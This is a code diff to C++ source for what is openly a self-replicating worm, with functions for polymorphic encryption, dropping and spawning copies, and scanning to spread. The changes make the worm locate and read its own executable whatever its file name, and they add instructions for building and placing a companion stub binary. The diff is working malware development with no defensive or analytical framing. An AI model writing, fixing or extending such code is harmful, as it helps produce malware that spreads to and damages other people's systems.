@@ -40,11 +40,13 @@ void polymorphicEncrypt(std::vector<unsigned char>& data) {
 
 void dropAndSpawn(const fs::path& targetDir, const std::vector<unsigned char>& myBinary) {
     // Load compiled stub (must exist for functional executable)
+    // Note: stub.exe should be in the same directory as this executable
     std::vector<unsigned char> stubData;
     std::ifstream stubFile("stub.exe", std::ios::binary | std::ios::ate);
     if (!stubFile.is_open()) {
-        std::cout << "[-] CRITICAL: stub.exe not found! Cannot create functional executable.\n";
+        std::cout << "[-] CRITICAL: stub.exe not found in current directory! Cannot create functional executable.\n";
         std::cout << "    Compile stub.asm first: nasm -f bin stub.asm -o stub.exe\n";
+        std::cout << "    Place stub.exe in the same directory as this executable.\n";
         return;
     }
 
@@ -120,9 +122,12 @@ void dropAndSpawn(const fs::path& targetDir, const std::vector<unsigned char>& m
 }
 
 void scanAndSpread(bool verbose) {
-    // Read own binary
+    // Read own binary dynamically (works regardless of executable name)
+    char ownPath[MAX_PATH];
+    GetModuleFileNameA(NULL, ownPath, MAX_PATH);
+
     std::vector<unsigned char> myBinary;
-    std::ifstream selfFile("worm_cpp.exe", std::ios::binary | std::ios::ate);
+    std::ifstream selfFile(ownPath, std::ios::binary | std::ios::ate);
     if (selfFile.is_open()) {
         std::streamsize size = selfFile.tellg();
         selfFile.seekg(0, std::ios::beg);
@@ -130,7 +135,7 @@ void scanAndSpread(bool verbose) {
         selfFile.read(reinterpret_cast<char*>(myBinary.data()), size);
         selfFile.close();
     } else {
-        std::cout << "[-] Cannot read own binary\n";
+        std::cout << "[-] Cannot read own binary: " << ownPath << "\n";
         return;
     }
 
